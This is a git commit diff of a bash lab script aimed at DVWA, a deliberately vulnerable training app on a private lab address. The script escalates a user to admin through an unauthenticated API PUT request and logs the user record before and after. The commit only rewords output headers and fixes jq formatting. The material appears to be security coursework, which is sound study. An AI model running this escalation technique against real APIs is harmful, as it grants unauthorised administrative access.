a0ba5f52ac399edfcfe3fd3bd1e27f7bcac67a4c
Wiktoria Blomgren Strandberg <102546496+wikblo-0@users.noreply.github.com>
2026-05-12 15:17:43 +0200

    Refactor user data retrieval and elevation logging

--- medium_security_level.sh
+++ medium_security_level.sh
@@ -1,21 +1,25 @@
 #!/bin/bash
 
-( echo "=== BEFORE ==="
+{
+echo "Attempts to retrieve user data before user elevation..."
+echo "---------------------------------------------------"
 curl -s \
 http://192.168.56.105/DVWA/vulnerabilities/api/v2/user/2 \
-| jq -r '"ID:(.id) Name:(.name) Level:(.level)"'
+| jq -r '"ID:\(.id) Name:\(.name) Level:\(.level)"'
 echo ""
 
-echo "=== MODIFYING USER ==="
+echo "Attempts to elevate user to admin..."
+echo "---------------------------------------------------"
 curl -s -X PUT \
 http://192.168.56.105/DVWA/vulnerabilities/api/v2/user/2 \
 -H "Content-Type: application/json" \
 -d '{"name":"morph","level":0}' \
-| jq -r '"UPDATED -> ID:(.id) Name:(.name) Level:(.level)"'
+| jq -r '"UPDATED -> ID:\(.id) Name:\(.name) Level:\(.level)"'
 echo ""
 
-echo "=== AFTER ==="
+echo "Attempts to retrieve user data after user elevation..."
+echo "---------------------------------------------------"
 curl -s \
 http://192.168.56.105/DVWA/vulnerabilities/api/v2/user/2 \
-| jq -r '"ID:(.id) Name:(.name) Level:(.level)"'
-) > /home/kali/api_medium.log
+| jq -r '"ID:\(.id) Name:\(.name) Level:\(.level)"'
+}> /home/kali/api_medium.log
